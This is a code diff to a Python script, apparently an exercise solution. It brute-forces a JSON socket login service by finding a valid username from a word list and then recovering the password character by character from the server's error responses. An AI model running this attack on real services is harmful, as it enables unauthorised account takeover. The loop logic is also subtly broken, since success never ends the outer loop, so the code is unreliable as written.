@@ -1,8 +1,17 @@
 import itertools
+import json
 import socket
 import sys
 
 password_list = "passwords.txt"
+login_list = "logins.txt"
+
+
+def login_generator_from_file(file):
+    with open(file, "r") as f:
+        content = f.readlines()
+    for row in range(len(content)):
+        yield content[row].strip("\n")
 
 
 def password_generator(length):
@@ -46,26 +55,44 @@ def generate_from_file(file):
     with open(file, "r") as f:
         content = f.readlines()
     for row in range(len(content)):
-        yield content[row].strip()
+        yield content[row].strip("\n")
 
 
 def connection(ip=None, port=None):
     if ip is None or port is None:
         ip, port = get_connection_data()
+    letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
 
-    gen = generate_from_file(password_list)
+    passwords = generate_from_file(password_list)
+    logins = generate_from_file(login_list)
 
     response = ""
+    right_login = ""
     with socket.socket() as sock:
         try:
             sock.connect((ip, port))
-            for x in gen:
-                for y in all_casings(x):
-                    sock.send(y.encode())
+            partial = ""
+            for login in logins:
+                sock.send(json.dumps({"login": login, "password": ""}).encode())
+                response = sock.recv(1024).decode()
+
+                if json.loads(response) == json.loads('{"result": "Wrong password!"}'):
+                    right_login = login
+                    break
+
+            while True:
+                for letter in letters:
+                    sending = json.dumps({"login": right_login, "password": partial + letter}).encode()
+                    sock.send(sending)
                     response = sock.recv(1024).decode()
-                    if "Connection success!" in response:
-                        print(y)
+
+                    if response == '{"result": "Connection success!"}':
+                        print(json.dumps({"login": right_login, "password": partial + letter}))
                         break
+
+                    if response == '{"result": "Exception happened during login"}':
+                        partial = partial + letter
+
         except ConnectionRefusedError:
             print(response)
         except ConnectionAbortedError:
